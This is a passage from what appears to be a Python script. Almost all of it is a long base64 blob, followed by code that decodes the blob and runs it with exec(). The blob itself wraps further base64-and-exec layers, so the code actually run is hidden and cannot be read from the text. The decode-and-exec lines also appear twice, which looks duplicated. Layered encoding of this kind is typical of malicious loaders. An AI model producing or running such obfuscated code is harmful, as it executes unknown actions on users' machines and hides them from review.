zWWtkd1ZXSkZNVFJYU0hCR1pVWnJlV0ZIYUdwaVJHdDNXVEl4UjJOSFVrbFVhM0JhVFVaYVIxWkhlRTVsUm1nMllrZG9hVkl6YURKWFZFcEhUVWRKZWxOcmNGcE5SbHBIVld4V1YyTkZiSEJrTUhSS1VUQkdibE5WVGt0YWJHUnlUa2hvVDAxVlNqVlpha3AzWWtacmVsVnVRbWxTTVZwUFYxWmpNV0ZHYjNsV2JteFFWakJhY2xkcldrdGtiR3Q1WkVkNGExSldWWGxYVkU1RFZqRndXRlJxUW1GaVJURXpWMFJHUWsxc1dYbFdiV2hxVW5wc01WZFhjekZXUjFKRlYyMWFXVTFxVm5KWldIQkdaVVV4ZEZOdGFHcE5iWGh4VjBST1QwMUhUblJpU0ZaaFRVZDRjVlpIZUU1bGJHZzJVbGhvV2sxdGFHOVpNbmMxVFVkT2RGSnVRbXRUUlRWTFYxUkNWMUpzVW5OVVdIQlpaVzE0YjFsclpEUmtiR3Q1VW1wQ2FVMHdjRXRYVkVKWFVteEtWbFpYYkUxUlZ6bHVVMVZPUWxvd2JITlBWMFpWWVd0VmVsWlZhRXRrYlVaMFZtMXdhMUl5ZUhwWGJGVjRZVWRLZEZKdE5XRlhSV3Q1VjFaa1UyRXhWWGxTYWs1VFZrWndjVmt3V21GaVJtdDZWVzB4Vm1WclNtMVdWVkpoVjBad1dGSnVaR2xOYWxad1ZrZDRUMDFGTlhOUFYxcHBZbFpLZVZSV1VrWmxWbXgwVW01d2FGWXdNWEJSTW5kM1V6Qk9ibU5FUW1waWJYTXlVVEpzUWxvd2JFUlJhazVvVjBaS2RsTlZZelZrTVhCWVRrYzVhVTB4V1hkWk1HaFhUVVpuZWxWcVVtdFNhbXd6VjFab1UySXdlRVJSVnpWclpWZE9kMU5WWkVkbGEyeEpWV3BTYTFKcWJIUlpWbVEwWWtVNWJtSXlaRXBSTUVadVUxVk9RbG93YkVSVVYyUlZUVEJLYzFsdGJFTk5SMFpJVmxka2ExSXhXVEJhUlU1RFlsZEdXR1ZIZUVwU01uZ3hVMVZvUzJKR2JGaFZWMlJwVm5wc2NsZHNSblphTUd4RVVWZGtTbEV3Um01VFZXUmhZMGRLU0ZadFdtcFNNRmwzV1ZWT1FrOVZiRWhYYmtKcFVqRmFiVmRyWkhObFZXeEVVVmR3U2xKc1dqWlhiRTVEVFVkR1NGWlhaR3RYUlRWeldUSnJlR05IU25WUmFrWnJVVEJLY2xsV2FFdGlSbXQ2Vlc1YWFtSnRkRzVaTUdSSFRVZEdRbUl3ZEVwUk1FWnVVMVZPUWxvd2JFUlJha0pxWW0xek1sRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzU1ZwSVFtdFNNbVJ1V1dwT1EySkhTbkJoUnpGb1ZqTm9jMWRFVGtOaFIxSklXak5PU2xFeVVqVlRibXh5V2pGc1dWUlhaR0ZpVjNoNlYyeFNkbE13YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1T1dqRlNTRTlZV21wUk1FbDNXVlZvUzJSdFVsaGFSemxLVWpGYWIxZFVTbTVhTWtwSVlraFdZVlV3U25kWmJXeERUVWRHU0ZaWFpHRmlWM2g2VjJ4R2Rsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVhiVEExWlZWc1NHVklRbWxpVmxadVdWWmpNRm94Y0hSaVNFNWhWa2M1VEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUW1GcmJFWmxTRnBwVFRCR2JscEZaRzlsVjBsNlZtMDFhRkV3U25OWFZtUlBZakJzU1ZWdGFHcGlWMUp6V2tWT1EyVnRVa2xUYmtKcFlsZE9URk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RMkpYU1hwVFYyUnJVakJhTlZkcVNsZE5SbWQ2VkdwQ2FtSlhlREZYYm14RFkwZEtjRkZxUWxwWFJYQjFWMnhvVTFwdFRYcFZibXhvVm5wV2RWa3pjSFpUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5ZYkVOU1IwWklWbTF3YUdWVlNuZFhiV3hEVFVkR1NGWlhaR3RTTUZvMVYycEtWMDFGYkVsVWFrSnFZbGQ0TVZkdWJFTmpSMDQxVVc1a2FtSldXalpYYkdNeFRVVnNTR0pJVmtwVFJrcDJWMnhPUTJNeVJsaE9WM2hFWVZWR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWhpUnpGS1UwWktiMWt5TVd0aVIxSkhUMWh3YTFORmNIZFpiVEZxV2pKR1dFNUhaR2xTTW5neFYyeFNkbE13YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlVWMlJUWWxkNE1WZHJUa05pTVhCWllVZG9ZVkl4V25GWlZtTjRZVWRLUkZGdVZtdFdla1p3VjJ4b1MyVnJiRWhpU0ZaS1UwWktkbGRzVGtOak1rWllUbGQ0U2xOR1dqWlpWbU14WW10c1NGSlhaR3BpVmxwMVdrWmtOR0ZIVG5CUmJYaHNVMFZLTlZkc2FFOWxiVVpZVDFoV1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3U25aWGJHaHZXbTFLZFZadVVscGlWbG8xV1ROc1FrOVZiRWxUYlhoTllsWndkMWx0TVZOaFIwcElaREk1YW1GWFRqTmFWVm93V1RGd1NGSllVbUZoTUZZd1ZXMTNkMk5yY0RWa01tUnBVako0TVZkc1RuSlRNRTV3VVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZHdTbEpXV1RCYVJXaExZVVpyZWxWWFpHdFNNbWh6VTFWa01HSkhWbGxhU0ZwcVlsWkdibGR0TlV0a2JVcFVVV3BDYUZJeFZtNWFSV1JIWlZadmVWWnFRa3BUUlRSM1dUSXhjMlJXY0ROaU1tUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJvVFd4Wk1WcEVTVFZsVm5CRVVWUnNTbEl4V1RCYVJXaExZVVpyZWxWdFdtaE5iRmt4V2tSSk5XVldjRVJoUkVKYVYwVndkVmRzYUZOYWJVMTZWVzVzYUZaNlZuVlRNVVoyVXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRlJYWkZkTk1IQjNXa1ZrVmxveVVraGhSM2hLVWpGS2IxcEZaRVphTWxKSVQwZGthMUl5YUhOVFZXaFRZa2RXU1ZWWFpHRmlWM2g2VjJ4T1EwMHlSbGxWYlRsS1VqQTFNbGxyWXpWbFYwNHpZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka2ExTkhaM2RYUkVwaFkwZEtTRlpZVm10Tk1IQjNXa1ZrVm1JeGNIQlRhMlJyVm5wV2NWcEZaSE5rYlVwd1VWUnNTbE5JVVhkWFZtaExZbXh3V1ZWdFdtcE5NVW8xV1Zaak1XSnRXbGRsU0ZaS1lWZDBURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlpITmlWV3hJWVVkNGJGSnFiREZhUm1ONFlWWndXVk51Y0ZCYU1qbHVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWxWYWxKclVtcHNkRmxXWkRSaVJYaDFXa2hzYUZkR1NuTlRNRTVMVlVad2RGZHVjR0ZYUmtadVZXMHdOVTFYU25SVlZGcEtZVmQwVEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWVjBTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDWVd0c1JtSkhNVXBUUmtwMlYyeG9TMkpGYkVoU2JteGhWVEJKZDFwRVNUUmFNa1pJVm1wU1NsSjZWWGhaYkdSTFlrZE9kVlJYWkZwV2VsWnlVMVZvVTJJeGNGbGhNbVJhVjBWd2MxTlZhRk5pTVhCVVVXNXdXbFo2Um5OVVJVNURUVEpPZEdKRVFtRlZNRW95V1cweE5FNVZiRWhQV0ZaaFZWYzVibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hJWWtjeFNsSXphSE5aYld4dlpXeHdXVlZYT1doU01Wa3dWMFJKTVUxWFNsaFRiWGhxWW1zeGQxTXhUa0pQVmtKVVVWaG9VRm95T1c1VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVsM1dsVm9VMXBzY0hSaVNFNWhWWHBWZWxreU1YTk5SbkJVWVVjeFNtSnVVblpYYkdodldtMUtkVlp1VWxwaVZsbzFXWHBHZW1ReGFGbE5WMDVwWVZWc2QxRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrWVZZemFEWlhiRkoyVXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxveGNIUlBXR3hLVWpKb2MxcFZXVFZrVjFKWVRVZGthRlo2VW01WlZXUlhUa1puZVU1VVJtbFdNSEJ6V1RJMVRrNXJUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdTWGRhVldoVFdteHdkR0pJVG1GVmVsVjZXVEl4YzAxR2NGUmhSekZLWW01U2RsZHNhRzlhYlVwMVZtNVNiVlp1YURGVFYyeHlVekJPY0ZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRnFRbXhUUmtwdFYyMHhjMk14Y0ZST1ZFNXFZbGQzZDFkc1RtNWhWbWhJVGtkc1RGVXdSbTVUV0d4RFVXeHdTRlZYWkZwVk1Fb3hWMnhvYTJNeVJsaE9WM2hLVWpCd2MxcEZhR3RpUm5CWVRrZGtZVlo2VlhkWk1qRnpZa2RPTTJJd2RFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBTTUhBMVYyeGtSMk5yYkVSUlYzQktVbFpaTUZsV2FGSmFNbEpJWVVkNFNsSXphREpaYWs1Q1dqRnNXRmRxUW1GWFJXeHVXa1ZrYjJKRmJFaFhia0pxWW1zMGQxTlZZelZoYkd0NlZtNXNhbUpXV2pGWFZFcFdXakpKZVZkWFpGcFZNRWwzVjFab1MySnNjRmxWVjJScVRURktOVmxXWXpGaWEwNXVZakprU2xFd1JtNVRWVTVDV2pCc1NGWnFVbHBOYkZveldrVk9RMUl5UmxobFIzaFZZbFJyZDFWdE1EVk5WMHAwVld0YWFtSnJjREpaTW5CMlV6QnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJxVTBWd2QxbHROVkppTVhCd1UycGtWbUV4V2taYWJGWmhZMGRLU0ZaWFpHbGlWR3QzVTFWa1lXUnRVbGhPVjNSS1VqQlpkMU5WYUVOaFIxSklXbnBhU2xOSVVuUlpWbVEwWWtabmVsRnRhR3RTTW1jMVdsUkdTMUpzVlhkV2JGWnRWVEJzZDFFeWJFSmFNR3hFVVZka1NsRXdSbTVYYkdodllXeHdXVkZxUWtwU1Zsa3dWMVJLVjJReVVraGlTRnBwWVZWS2Ixa3piRU5pUlRsdVlqSmtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRW96V1RJeGMyUlhVa1JoUnpGS1ltNVNWRlZzVmxOUFZrWllUa2RrWVZkRmNEVlphazVLV2pKSmVWUnRjR3RYUlhBMVYyeGtVazVyYkVsa1NIQnJVMFZzZGxkc1RuTlBWMVY0VTJ0YVZrMUdXbFphYkU1S1kwVk9ibU5IZUd4U01EVnpXVEJvVWxveFNuUmlTRTVoVmxSV01scEZWbUZrYlZKWVRsZDBVMWRGY0RWWmFrNUtUbXRPY0ZGWFpFcFJNRW96V1RJeGMyUlhVa1JoUnpGS1ltNVNWRlZzVmxOUFZsRjZWbXBDYWxOR1dYZFRWV2hUWWtkV1NWVlhaR0ZpVjNoNlYyeE9RMlF4YkZsVmJUbEtVbnBXTWxwRlRrTmlWMGw2Vm01V1lWSkhPVzVhVkVrMVRWZFNTVkZxUm10U2FtdDNXbFZvVTFwdFRraFNha0pvVTBSRk0xWlhkRmRXUmtwWFZXcHNTbUZYZEV4WGJHaHZZV3h3V1ZGcVFrcFNWbGt3VjFSS1YyUXlVa2hpU0ZwcFlWVktiMWt6YkVOaVJUbHVZakprU2xFd1JtNVpNR2hMWTBkS2RWVlhPV0ZoVlc4elZsZDBWMUpYV2xaU2JsWktVakZhTlZreU1EVmxWV3hJVDFkd1drMHhXalZaTWpGWFlUQnNTVnBIT1doV00yaHpVMVZvYTJWWFJsbFZia0pwWWxkT2JscEZZelJhTWxKSVlVZDRTbE5HU25OYVZXaFNXakZ3ZEdKSVRtRldSemx1V2xST1QwMUhUbkJoUjNoTVYwUkZNMVpYZEZkV1JrcFhWV3BzU21GWGRFeEpaM0IwV1Zkc2RXSnBRVGxKUjBwb1l6SlZNazVETldsT2FsSnJXbGRPZGxwSFZXOWlWMFp3WW1scmRWcEhWbXBpTWxKc1MwTmtNV1JIV1hSUFEyTndRMjFXTkZwWFRXOWlWMFp3WW0wMGNFTm5QVDBpQ20xaGFXNXVJRDBnWW1GelpUWTBMbUkyTkdSbFkyOWtaU2h0WVdsdUtTNWtaV052WkdVb0ozVjBaaTA0SnlrS1pYaGxZeWh0WVdsdWJpa0siCm1haW5uID0gYmFzZTY0LmI2NGRlY29kZShtYWluKS5kZWNvZGUoJ3V0Zi04JykKZXhlYyhtYWlubikK"
mainn = base64.b64decode(main).decode('utf-8')
exec(mainn)
"
mainn = base64.b64decode(main).decode('utf-8')
exec(mainn)
